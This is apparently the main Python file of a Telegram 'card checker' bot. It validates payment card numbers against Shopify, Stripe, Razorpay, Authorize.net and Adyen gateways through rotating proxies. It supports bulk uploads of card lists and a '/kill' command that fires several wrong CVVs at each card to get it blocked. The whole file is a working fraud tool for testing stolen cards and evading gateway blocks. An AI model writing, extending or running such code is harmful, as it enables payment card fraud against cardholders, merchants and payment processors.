import asyncio
import os
import time
import re
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler

from utils.proxy import load_proxies
from gates.shopify import shopify_check
from gates.stripe import stripe_check
from gates.razorpay import razorpay_check
from gates.adyen import adyen_check
from gates.authorize import authorize_check
from kill.kill import kill_cmd as kill_cmd_imported, check_cmd as check_cmd_imported
from tools.proxy_tester import test_proxies

TOKEN = os.getenv("TOKEN")
if not TOKEN:
    raise ValueError("TOKEN environment variable not set!")

# ================= PROXY CHECK =================
def ensure_proxy():
    count = load_proxies()
    return count

# ================= HELPER: PARSE CARD FROM FILE =================
def parse_card_line(line):
    line = line.strip()
    if not line or line.startswith('#'):
        return None
    # Try various separators: | / :
    for sep in ['|', '/', ':']:
        if sep in line:
            parts = line.split(sep)
            if len(parts) >= 4:
                card = parts[0].strip()
                month = parts[1].strip().zfill(2)
                year = parts[2].strip()
                cvv = parts[3].strip()
                if len(year) == 2:
                    year = f"20{year}"
                return (card, month, year, cvv)
    # If no separator, try spaces
    parts = line.split()
    if len(parts) >= 4:
        card = parts[0].strip()
        month = parts[1].strip().zfill(2)
        year = parts[2].strip()
        cvv = parts[3].strip()
        if len(year) == 2:
            year = f"20{year}"
        return (card, month, year, cvv)
    return None

def extract_cards_from_text(text):
    cards = []
    for line in text.split('\n'):
        parsed = parse_card_line(line)
        if parsed:
            cards.append(parsed)
    return cards

# ================= HANDLERS =================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    caption = (
        "🐉 **Welcome Lenin** »\n"
        "This bot promises you fast and safe checkups with different gateways! 🚀\n\n"
        "🤖 Bot Dev 🐉 Rift 🐉\n"
        "📦 Version 🐉 2.0 (Constantly Upgrading...)"
    )
    keyboard = [
        [InlineKeyboardButton("🚪 GATES", callback_data='main_gates')],
        [InlineKeyboardButton("👤 ACCOUNT", callback_data='main_account')],
        [InlineKeyboardButton("🛠 TOOLS", callback_data='main_tools')],
        [InlineKeyboardButton("❌ CLOSE", callback_data='main_close')],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    try:
        with open("dragon.jpg", "rb") as photo:
            await update.message.reply_photo(photo, caption=caption, parse_mode='Markdown', reply_markup=reply_markup)
    except:
        await update.message.reply_text(caption, parse_mode='Markdown', reply_markup=reply_markup)

async def account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = f"👤 *User Info*\n• Name: {user.first_name}\n• ID: {user.id}\n• Plan: Pro\n• Mass Limit: 5000\n• Private Access: On\n• Plan Expires: 2126-05-06"
    await update.message.reply_text(text, parse_mode='Markdown')

# -------------------- /pxy (Proxy Tester) --------------------
async def pxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    if not doc and update.message.reply_to_message:
        doc = update.message.reply_to_message.document
    if not doc:
        await update.message.reply_text(
            "❌ Please reply with a .txt file containing proxies.\n\n"
            "**Usage:**\n"
            "1. Send `/pxy` as a reply to a `.txt` file.\n"
            "2. Or send `/pxy` with the file attached in the same message.\n\n"
            "Example: Reply to a file message with `/pxy`",
            parse_mode='Markdown'
        )
        return
    if not doc.file_name or not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Only `.txt` files are supported.")
        return

    await update.message.reply_text("🔄 Testing proxies (may take 1-2 minutes for 500+ proxies)...")

    file = await doc.get_file()
    tmp_path = f"temp_{update.message.from_user.id}_{int(time.time())}.txt"
    await file.download_to_drive(tmp_path)

    with open(tmp_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = f.readlines()
    os.remove(tmp_path)

    if not lines:
        await update.message.reply_text("❌ File is empty.")
        return

    loop = asyncio.get_event_loop()
    working = await loop.run_in_executor(None, test_proxies, lines)

    if not working:
        await update.message.reply_text("❌ No working proxies found in the list.")
        return

    # Save to proxies.txt
    with open("proxies.txt", 'w') as f:
        f.write('\n'.join(working))
    count = load_proxies()

    out_path = f"working_{update.message.from_user.id}_{int(time.time())}.txt"
    with open(out_path, 'w') as f:
        f.write('\n'.join(working))

    await update.message.reply_document(
        document=open(out_path, 'rb'),
        caption=f"✅ Found **{len(working)}** working proxies.\n\n📁 They have been automatically added to the bot's proxy pool.\nCurrently loaded: {count} proxies.",
        parse_mode='Markdown'
    )
    os.remove(out_path)

# -------------------- /check and /kill (with file support) --------------------
async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if file is attached or replied
    doc = update.message.document
    if not doc and update.message.reply_to_message:
        doc = update.message.reply_to_message.document
    if doc:
        # Process file
        if not doc.file_name or not doc.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Only `.txt` files are supported.")
            return
        await update.message.reply_text("📄 Processing cards from file...")
        file = await doc.get_file()
        tmp_path = f"temp_{update.message.from_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(tmp_path)
        with open(tmp_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        os.remove(tmp_path)
        cards = extract_cards_from_text(content)
        if not cards:
            await update.message.reply_text("❌ No valid cards found in the file.")
            return
        # Process each card
        results = []
        for card, month, year, cvv in cards:
            status, msg, live = await authorize_check(card, month, year, cvv)
            emoji = "✅" if live is True else "❌" if live is False else "⚠️"
            results.append(f"{emoji} {card[:6]}******{card[-4:]} | {status} - {msg}")
        report = "\n".join(results)
        await update.message.reply_text(f"✅ Check complete.\n\n{report}")
        return
    # Else handle as inline arguments
    proxy_count = ensure_proxy()
    if proxy_count == 0:
        await update.message.reply_text("⚠️ No proxies loaded. Bot will try direct connection (may be blocked).")
    await check_cmd_imported(update, context)

async def kill_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Check if file is attached or replied
    doc = update.message.document
    if not doc and update.message.reply_to_message:
        doc = update.message.reply_to_message.document
    if doc:
        if not doc.file_name or not doc.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Only `.txt` files are supported.")
            return
        await update.message.reply_text("💀 Killing cards from file (parallel, max 2 at a time)...")
        file = await doc.get_file()
        tmp_path = f"temp_{update.message.from_user.id}_{int(time.time())}.txt"
        await file.download_to_drive(tmp_path)
        with open(tmp_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        os.remove(tmp_path)
        cards = extract_cards_from_text(content)
        if not cards:
            await update.message.reply_text("❌ No valid cards found in the file.")
            return
        # Process each card with kill logic (9 attempts)
        results = []
        for card, month, year, cvv in cards:
            # Generate 8 wrong CVVs
            wrong = set()
            while len(wrong) < 8:
                w = str(random.randint(100,999)).zfill(3)
                if w != cvv:
                    wrong.add(w)
            attempts = list(wrong) + [cvv]
            sem = asyncio.Semaphore(2)
            async def limited(c):
                async with sem:
                    return await authorize_check(card, month, year, c)
            tasks = [limited(c) for c in attempts]
            kill_results = await asyncio.gather(*tasks)
            # Check if any attempt was approved (card still live)
            live_found = any(r[2] is True for r in kill_results)
            dead_found = any(r[2] is False for r in kill_results)
            if dead_found and not live_found:
                results.append(f"💀 KILLED: {card[:6]}******{card[-4:]}")
            elif live_found:
                results.append(f"⚠️ LIVE: {card[:6]}******{card[-4:]}")
            else:
                results.append(f"❓ UNKNOWN: {card[:6]}******{card[-4:]}")
        report = "\n".join(results)
        await update.message.reply_text(f"✅ Kill complete.\n\n{report}")
        return
    # Else handle inline arguments
    proxy_count = ensure_proxy()
    if proxy_count == 0:
        await update.message.reply_text("⚠️ No proxies loaded. Bot will try direct connection (may be blocked).")
    await kill_cmd_imported(update, context)

# -------------------- Gateway Commands (no file support, just inline) --------------------
async def gateway_command(update: Update, context: ContextTypes.DEFAULT_TYPE, gateway_name: str):
    proxy_count = ensure_proxy()
    if proxy_count == 0:
        await update.message.reply_text("⚠️ No proxies loaded. Bot will try direct connection (may be blocked).")
    if not context.args:
        await update.message.reply_text(f"❌ Use: /{gateway_name} card|month|year|cvv")
        return
    raw = " ".join(context.args)
    parts = raw.split('|')
    if len(parts) != 4:
        tokens = raw.split()
        if len(tokens) >= 4:
            parts = tokens[:4]
        else:
            await update.message.reply_text("❌ Parse error. Example: `/{gateway_name} 4111111111111111|12|2026|123`")
            return
    card, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
    await update.message.reply_text(f"⚡ Checking {gateway_name.upper()}...")
    if gateway_name == 'shopify':
        status, msg, live = await shopify_check(card, month, year, cvv)
    elif gateway_name == 'stripe':
        status, msg, live = await stripe_check(card, month, year, cvv)
    elif gateway_name == 'razorpay':
        status, msg, live = await razorpay_check(card, month, year, cvv)
    elif gateway_name == 'authorize' or gateway_name == 'donation':
        status, msg, live = await authorize_check(card, month, year, cvv)
    elif gateway_name == 'adyen':
        status, msg, live = await adyen_check(card, month, year, cvv)
    else:
        status, msg, live = ("❌ ERROR", "Unknown gateway", None)
    emoji = "✅" if live is True else "❌" if live is False else "⚠️"
    await update.message.reply_text(f"{emoji} **{status}**\n{msg}")

async def shopify_cmd(update, context): await gateway_command(update, context, 'shopify')
async def stripe_cmd(update, context): await gateway_command(update, context, 'stripe')
async def razorpay_cmd(update, context): await gateway_command(update, context, 'razorpay')
async def authorize_cmd(update, context): await gateway_command(update, context, 'authorize')
async def donation_cmd(update, context): await gateway_command(update, context, 'donation')
async def adyen_cmd(update, context): await gateway_command(update, context, 'adyen')

# -------------------- Inline Keyboard Callback --------------------
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == 'main_gates':
        keyboard = [
            [InlineKeyboardButton("🛒 Shopify", callback_data='gate_shopify')],
            [InlineKeyboardButton("⚡ Stripe", callback_data='gate_stripe')],
            [InlineKeyboardButton("🪙 Razorpay", callback_data='gate_razorpay')],
            [InlineKeyboardButton("🏦 Authorize", callback_data='gate_authorize')],
            [InlineKeyboardButton("❤️ Donation", callback_data='gate_donation')],
            [InlineKeyboardButton("🔷 Adyen", callback_data='gate_adyen')],
            [InlineKeyboardButton("💀 KILL", callback_data='gate_kill')],
            [InlineKeyboardButton("🔍 CHECK", callback_data='gate_check')],
            [InlineKeyboardButton("⬅️ BACK", callback_data='main_back')],
        ]
        await query.edit_message_caption(
            caption="🔽 **Select a gateway**",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    elif data == 'main_account':
        user = update.effective_user
        text = f"👤 *User Info*\n• Name: {user.first_name}\n• ID: {user.id}\n• Plan: Pro\n• Mass Limit: 5000\n• Private Access: On\n• Plan Expires: 2126-05-06"
        await query.edit_message_caption(
            caption=text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data='main_back')]]),
            parse_mode='Markdown'
        )
    elif data == 'main_tools':
        await query.edit_message_caption(
            caption="🛠 **Tools Menu**\n\n"
                    "🔹 **/pxy** - Upload a `.txt` file with proxies. Bot tests and returns working ones.\n"
                    "🔹 **/check** - Check a card (inline or via file).\n"
                    "🔹 **/kill** - Kill a card (inline or via file).\n"
                    "🔹 More tools coming soon...",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ BACK", callback_data='main_back')]]),
            parse_mode='Markdown'
        )
    elif data == 'main_close':
        await query.edit_message_caption(caption="👋 Closed. Use /start to reopen.")
    elif data == 'main_back':
        caption = (
            "🐉 **Welcome Lenin** »\n"
            "This bot promises you fast and safe checkups with different gateways! 🚀\n\n"
            "🤖 Bot Dev 🐉 Rift 🐉\n"
            "📦 Version 🐉 2.0 (Constantly Upgrading...)"
        )
        keyboard = [
            [InlineKeyboardButton("🚪 GATES", callback_data='main_gates')],
            [InlineKeyboardButton("👤 ACCOUNT", callback_data='main_account')],
            [InlineKeyboardButton("🛠 TOOLS", callback_data='main_tools')],
            [InlineKeyboardButton("❌ CLOSE", callback_data='main_close')],
        ]
        await query.edit_message_caption(
            caption=caption,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )
    elif data.startswith('gate_'):
        gateway = data.replace('gate_', '')
        await query.edit_message_caption(
            caption=f"Send card in format: `/{gateway} card|month|year|cvv`\nExample: `/{gateway} 4111111111111111|12|2026|123`\n\nOr reply to a `.txt` file with `/check` or `/kill` for bulk processing.",
            parse_mode='Markdown'
        )

# ================= MAIN =================
def main():
    load_proxies()  # initial load
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("account", account))
    app.add_handler(CommandHandler("pxy", pxy_cmd))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CommandHandler("kill", kill_cmd))
    app.add_handler(CommandHandler("shopify", shopify_cmd))
    app.add_handler(CommandHandler("stripe", stripe_cmd))
    app.add_handler(CommandHandler("razorpay", razorpay_cmd))
    app.add_handler(CommandHandler("authorize", authorize_cmd))
    app.add_handler(CommandHandler("donation", donation_cmd))
    app.add_handler(CommandHandler("adyen", adyen_cmd))
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
